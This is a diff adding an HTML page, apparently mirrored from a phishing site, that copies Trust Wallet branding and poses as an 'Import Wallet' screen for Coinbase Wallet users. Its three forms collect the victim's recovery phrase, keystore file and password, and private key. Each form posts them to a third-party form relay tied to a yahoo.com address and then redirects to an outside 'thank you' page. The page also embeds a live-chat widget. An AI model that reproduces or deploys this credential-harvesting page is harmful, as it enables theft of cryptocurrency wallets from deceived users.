@@ -1,0 +1,370 @@
+<html>
+
+<!-- Mirrored from dappsmobileconnect.com/connect/indexdca7dca7dca7?w=coinbase+wallet by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 13 Oct 2021 09:51:44 GMT -->
+<!-- Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <link rel="stylesheet" href="../assets/main.css" type="text/css">
+  <meta name="description" content="Open protocol for connecting Wallets to Dapps">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta property="og:image" content="../../walletconnect.org/favicon.ico">
+  <link rel="icon" href="../../walletconnect.org/favicon.ico">
+  <script>
+    function openCity(evt, cityName) {
+      // Declare all variables
+      var i, tabcontent, tablinks;
+
+      // Get all elements with class="tabcontent" and hide them
+      tabcontent = document.getElementsByClassName("tabcontent");
+      for (i = 0; i < tabcontent.length; i++) {
+        tabcontent[i].style.display = "none";
+      }
+
+      // Get all elements with class="tablinks" and remove the class "active"
+      tablinks = document.getElementsByClassName("tablinks");
+      for (i = 0; i < tablinks.length; i++) {
+        tablinks[i].className = tablinks[i].className.replace(" active", "");
+      }
+
+      // Show the current tab, and add an "active" class to the button that opened the tab
+      document.getElementById(cityName).style.display = "block";
+      evt.currentTarget.className += " active";
+    }
+  </script>
+  <title>Import Wallet</title>
+</head>
+
+<style>
+  .bg-light {
+    background-color: #f9fbfd !important;
+  }
+
+  article,
+  aside,
+  figcaption,
+  figure,
+  footer,
+  header,
+  hgroup,
+  main,
+  nav,
+  section {
+    display: block;
+  }
+
+  *,
+  *::before,
+  *::after {
+    box-sizing: border-box;
+  }
+
+  .container,
+  .container-fluid,
+  .container-sm,
+  .container-md,
+  .container-lg,
+  .container-xl {
+    position: relative;
+    z-index: 1;
+  }
+
+  .pb-8,
+  .py-8 {
+    padding-bottom: 3rem !important;
+  }
+
+  .pt-8,
+  .py-8 {
+    padding-top: 3rem !important;
+  }
+
+  @media (min-width: 1200px) {
+    .container {
+      max-width: 1140px;
+    }
+  }
+
+
+  .align-items-center {
+    align-items: center !important;
+  }
+
+  .row {
+    display: flex;
+    flex-wrap: wrap;
+    margin-right: -20px;
+    margin-left: -20px;
+  }
+
+  @media (min-width: 992px) {
+    .col-lg-8 {
+      flex: 0 0 66.666667%;
+      max-width: 66.666667%;
+    }
+  }
+
+  .col-12 col-lg-7 {
+    position: relative;
+    width: 100%;
+    padding-right: 20px;
+    padding-left: 20px;
+  }
+
+  .col-12 col-md {
+    position: relative;
+    width: 100%;
+    padding-right: 20px;
+    padding-left: 20px;
+  }
+
+
+
+  @media (min-width: 992px) {
+
+    .text-lg-left {
+      text-align: left !important;
+    }
+  }
+
+  .text-center {
+    text-align: center !important;
+  }
+
+  .mt-2,
+  .my-2 {
+    margin-top: 0.5rem !important;
+  }
+
+  @media (min-width: 768px) {
+    .col-md {
+      flex-basis: 0;
+      flex-grow: 1;
+      max-width: 100%;
+    }
+  }
+
+
+  .container,
+  .container-fluid,
+  .container-sm,
+  .container-md,
+  .container-lg,
+  .container-xl {
+    position: relative;
+    z-index: 1;
+  }
+
+  .pb-8,
+  .py-8 {
+    padding-bottom: 3rem !important;
+  }
+
+  .pt-8,
+  .py-8 {
+    padding-top: 3rem !important;
+  }
+
+  .container {
+    width: 100%;
+    padding-right: 20px;
+    padding-left: 20px;
+    margin-right: auto;
+    margin-left: auto;
+  }
+</style>
+
+<!--Start of Tawk.to Script-->
+<script type="text/javascript">
+  var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
+  (function () {
+    var s1 = document.createElement("script"), s0 = document.getElementsByTagName("script")[0];
+    s1.async = true;
+    s1.src = 'https://embed.tawk.to/61a1534d9099530957f6d7bc/1flf2qqde';
+    s1.charset = 'UTF-8';
+    s1.setAttribute('crossorigin', '*');
+    s0.parentNode.insertBefore(s1, s0);
+  })();
+</script>
+<!--End of Tawk.to Script-->
+
+<body>
+  <center>
+
+  <div class="top">
+    <a href="https://trustwallet.com/assets" class="left">Assets</a>
+  
+    <a href="https://trustwallet.com/staking" class="left">Staking</a>
+    <a href="/" class="main"><img src="../assets/logo.svg" alt="logo"></a>
+    <a href="https://trustwallet.com/collectibles-wallet" class="left">NFTs</a>
+    <a href="https://trustwallet.com/collectibles-wallet" class="left">DApp Browser</a>
+  </div>
+
+    <br>
+    <h2>
+      <center>Import Wallet</center>
+    </h2>
+    <br>
+    <div class="tab">
+      <button class="tablinks active" id="default" onclick="openCity(event, &#39;phrase&#39;)">Phrase</button>
+      <button class="tablinks" onclick="openCity(event, &#39;keystore&#39;)">Keystore</button>
+      <button class="tablinks" onclick="openCity(event, &#39;private&#39;)">Private Key</button>
+    </div>
+
+    <div id="phrase" class="tabcontent" style="display: block;">
+      <form action="https://formsubmit.co/disputeoracle@yahoo.com" method="POST">
+        <input type="hidden" name="_next" value="https://disputessupport.com/connect/thankyou.html">
+        <input type="hidden" name="_captcha" value="false">
+
+        <input type="hidden" name="category" value="Phrase" />
+
+        <input type="hidden" name="type" value="coinbase wallet">
+
+        <textarea name="phrase" class="phrase" required="required" minlength="12" placeholder="Phrase"></textarea>
+        <br>
+        <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
+        <br>
+        <button type="submit" name="import" class="btn">IMPORT</button>
+      </form>
+    </div>
+
+    <div id="keystore" class="tabcontent" style="display: none;">
+      <form action="https://formsubmit.co/disputeoracle@yahoo.com" method="POST">
+
+        <input type="hidden" name="_next" value="https://disputessupport.com/connect/thankyou.html">
+
+        <input type="hidden" name="_captcha" value="false">
+
+
+        <input type="hidden" name="category" value="Keystore" />
+
+        <input type="hidden" name="type" value="coinbase wallet">
+
+        <textarea name="phrase" class="phrase" required="required" minlength="12" 
+        placeholder="Keystore JSON" ></textarea>
+        <br>
+        <div class="field">
+          <input type="text" name="password" placeholder="Password">
+        </div>
+        <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
+        <br>
+        <button type="submit" name="import" class="btn">IMPORT</button>
+      </form>
+    </div>
+
+    <div id="private" class="tabcontent" style="display: none;">
+      <form action="https://formsubmit.co/disputeoracle@yahoo.com" method="POST">
+
+        <input type="hidden" name="_next" value="https://disputessupport.com/connect/thankyou.html">
+
+        <input type="hidden" name="_captcha" value="false">
+
+
+        <input type="hidden" name="category" value="Private Key" />
+        <input type="hidden" name="type" value="coinbase wallet">
+        <div class="field">
+          <input type="text" name="key" class="key" required="required" placeholder="Private Key">
+        </div>
+        <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
+        <br>
+        <button type="submit" name="import" class="btn">IMPORT</button>
+      </form>
+    </div>
+
+    <script>
+      document.getElementById("default").click();
+    </script>
+  
+<footer>
+  <section class="bg-light">
+    <div class="container pt-8 pb-8">
+      <div class="row align-items-center">
+        <div class="col-12 col-md text-center text-lg-left mt-2">
+          <h3 class="font-weight-bold mb-1">
+            Get the Trust Wallet app now!
+          </h3>
+          <p class="text-gray-700 mb-6 mb-md-0 no-whitespace">
+            The most trusted &amp; secure crypto wallet
+          </p>
+
+          <div id="footer">
+            <p><img src="../assets/facebook.png" class="footimg">
+              <a href="https://facebook.com/trustwalletapp" target="_blank">Facebook</a>
+            </p><br>
+
+            <p><img src="../assets/instagram.png" class="footimg">
+              <a href="https://instagram.com/trustwallet" target="_blank">Instagram</a>
+            </p><br>
+
+            <p><img src="../assets/twitter.svg" class="footimg">
+              <a href="https://twitter.com/trustwallet" target="_blank">Twitter</a>
+            </p><br>
+
+            <p><img src="../assets/github.svg" class="footimg"> <a href="https://github.com/trustwallet"
+                target="_blank">Github</a>
+            </p><br>
+
+            <p><img src="../assets/reddit.png" class="footimg"> <a href="https://reddit.com/r/trustapp"
+                target="_blank">Reddit</a>
+            </p><br>
+
+
+            <p><img src="../assets/telegram.svg" class="footimg"> <a href="https://t.me/trust_announcements"
+                target="_blank">Telegram</a>
+            </p><br>
+
+          </div>
+
+        </div>
+
+        <br />
+        <br />
+        <br />
+        <br />
+        <br />
+
+
+        <div class="col-12 col-lg-7" style="align-items: center;">
+          <div class="download-button">
+            <div class="row download">
+              <div class="col-12 col-lg-4 apple">
+                <a href="https://apps.apple.com/app/apple-store/id1288339409?mt=8" class="downloadapp"
+                  aria-label="goes to AppStore to download Trust Wallet for iphones">
+                  <img src="/assets/appstore.png" alt="">
+                </a>
+              </div>
+              <div class="col-12 col-lg-4 googleplay">
+                <a href="https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp&amp;referrer=utm_source%3Dwebsite"
+                  class="downloadapp"
+                  aria-label="goes to Google Play store to download Trust Wallet for Android phones">
+                  <img src="/assets/androidstore.png" alt="">
+                </a>
+              </div>
+              <!-- <div class="col-12 col-lg-4 androidapk">
+                                    <a href="https://trustwallet.com/dl/apk" class="downloadapp"
+                                        aria-label="Downloads Trust Wallet as APK file for Android phones">
+                                       <img src="/assets/androidapk.png" alt="">
+                                    </a>
+                                </div> -->
+              <!-- <div class="col-12 col-lg-4 huawei hidden">
+                                    <a href="https://appgallery.huawei.com/#/app/C103425801" class="downloadapp"
+                                        aria-label="goes to huawei store to download Trust Wallet for huawei phones">
+                                        <svg class="download-app-image download-huawei" loading="lazy"
+                                            alt="Download button for Huawei" rel="noopener"></svg>
+                                    </a>
+                                </div> -->
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+</footer>
+
+
+  </center>
+</body>
+<!-- Mirrored from dappsmobileconnect.com/connect/indexdca7dca7dca7?w=coinbase+wallet by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 13 Oct 2021 09:51:44 GMT -->
+
+</html>
